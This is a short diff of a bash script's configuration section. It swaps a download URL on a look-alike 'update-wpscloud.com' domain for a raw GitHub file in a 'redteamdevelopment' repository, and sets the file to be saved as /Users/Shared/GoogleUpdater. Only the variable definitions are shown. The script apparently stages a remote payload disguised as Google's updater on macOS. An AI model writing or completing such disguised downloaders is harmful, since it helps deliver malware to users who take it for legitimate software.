@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- 配置变量 ---
-DOWNLOAD_URL="https://update-wpscloud.com/activee"
+DOWNLOAD_URL="https://raw.githubusercontent.com/redteamdevelopment/test.sh/refs/heads/main/activee"
 TARGET_DIR="/Users/Shared"
 UPDATER_NAME="GoogleUpdater"
 UPDATER_PATH="${TARGET_DIR}/${UPDATER_NAME}"
